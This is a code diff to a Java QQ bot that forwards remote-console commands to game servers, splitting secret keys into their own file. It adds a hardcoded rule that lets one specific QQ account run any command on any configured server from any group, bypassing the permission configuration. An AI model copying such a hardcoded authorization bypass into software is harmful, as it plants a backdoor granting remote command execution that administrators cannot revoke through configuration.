@@ -23,10 +23,10 @@ import static top.yzljc.utiltools.LikeUser.sendLike;
 public class SendLike {
     private static final String NAPCAT_API = "http://106.14.23.232:8848/send_group_msg";
     private static final String ADMIN_FILE = "adminuser.json";
+    private static final String SERVER_SECRET_FILE = "server-secret.json";
     private static final ObjectMapper jsonMapper = new ObjectMapper();
-
-    // 【核心修改 1】 Value 改为 List，支持一对多
-    private static Map<String, List<AuthInfo>> adminRules = new HashMap<>();
+    private static Map<String, List<String>> adminRules = new HashMap<>();
+    private static Map<String, String> serverSecretMap = new HashMap<>();
 
     public static final ConcurrentHashMap<String, CompletableFuture<String>> pendingCommandResponses = new ConcurrentHashMap<>();
 
@@ -125,9 +125,29 @@ public class SendLike {
 
             String key = userId + "/" + groupId;
 
+            // 【添加权限豁免】QQ号为3199590352的用户在任何群拥有任何服务器的控制权限
+            if (String.valueOf(userId).equals("3199590352")) {
+                // 解析指令，获取目标 ServerID
+                String[] parts = rawMessage.trim().split("\\s+", 3);
+                if (parts.length < 3) {
+                    sendGroupMessage(groupId, "格式错误: /rc <ServerID> <Command>");
+                    return;
+                }
+                String targetServerId = parts[1];
+                String command = parts[2];
+                String secretKey = serverSecretMap.get(targetServerId);
+
+                if (secretKey != null) {
+                    executeRcCommand(targetServerId, command, new AuthInfo(targetServerId, secretKey), groupId);
+                } else {
+                    sendGroupMessage(groupId, "[!] 未找到目标服务器的密钥: " + targetServerId);
+                }
+                return;
+            }
+
             // 先检查该用户在当前群是否有任何权限配置
             if (adminRules.containsKey(key)) {
-                List<AuthInfo> userServers = adminRules.get(key);
+                List<String> userServers = adminRules.get(key);
 
                 // 解析指令，获取目标 ServerID
                 String[] parts = rawMessage.trim().split("\\s+", 3);
@@ -140,9 +160,12 @@ public class SendLike {
 
                 // 【核心修改 2】 遍历列表，寻找匹配的 ServerID
                 AuthInfo matchedInfo = null;
-                for (AuthInfo info : userServers) {
-                    if (info.serverId.equals(targetServerId)) {
-                        matchedInfo = info;
+                for (String sid : userServers) {
+                    if (sid.equals(targetServerId)) {
+                        String secret = serverSecretMap.get(targetServerId);
+                        if (secret != null) {
+                            matchedInfo = new AuthInfo(sid, secret);
+                        }
                         break;
                     }
                 }
@@ -242,29 +265,45 @@ public class SendLike {
     // 【核心修改 3】加载逻辑适配一对多
     private static void loadAdminConfig() {
         try {
-            Path path = Paths.get(ADMIN_FILE);
-            if (Files.exists(path)) {
-                JsonNode rootNode = jsonMapper.readTree(path.toFile());
+            // 加载 adminuser.json
+            Path adminPath = Paths.get(ADMIN_FILE);
+            Map<String, List<String>> newRules = new HashMap<>();
 
-                Map<String, List<AuthInfo>> newRules = new HashMap<>();
+            if (Files.exists(adminPath)) {
+                JsonNode rootNode = jsonMapper.readTree(adminPath.toFile());
 
                 if (rootNode.isArray()) {
                     for (JsonNode node : rootNode) {
                         String user = node.path("user").asText();
                         String group = node.path("group").asText();
                         String sId = node.path("server-id").asText();
-                        String secret = node.path("secret-key").asText();
 
-                        if (!user.isEmpty() && !group.isEmpty()) {
+                        if (!user.isEmpty() && !group.isEmpty() && !sId.isEmpty()) {
                             String key = user + "/" + group;
-                            // 如果 Key 不存在，初始化一个新的 List
-                            newRules.computeIfAbsent(key, k -> new ArrayList<>())
-                                    .add(new AuthInfo(sId, secret));
+                            newRules.computeIfAbsent(key, k -> new ArrayList<>()).add(sId);
                         }
                     }
                 }
-                adminRules = newRules;
             }
+            adminRules = newRules;
+
+            // 加载 server-secret.json
+            Path secretPath = Paths.get(SERVER_SECRET_FILE);
+            Map<String, String> secretMap = new HashMap<>();
+
+            if (Files.exists(secretPath)) {
+                JsonNode secNode = jsonMapper.readTree(secretPath.toFile());
+                if (secNode.isArray()) {
+                    for (JsonNode node : secNode) {
+                        String sid = node.path("server-id").asText();
+                        String secret = node.path("secret-key").asText();
+                        if (!sid.isEmpty() && !secret.isEmpty()) {
+                            secretMap.put(sid, secret);
+                        }
+                    }
+                }
+            }
+            serverSecretMap = secretMap;
         } catch (IOException e) {
             System.out.println("[WARN] 读取权限配置文件失败: " + e.getMessage());
         }
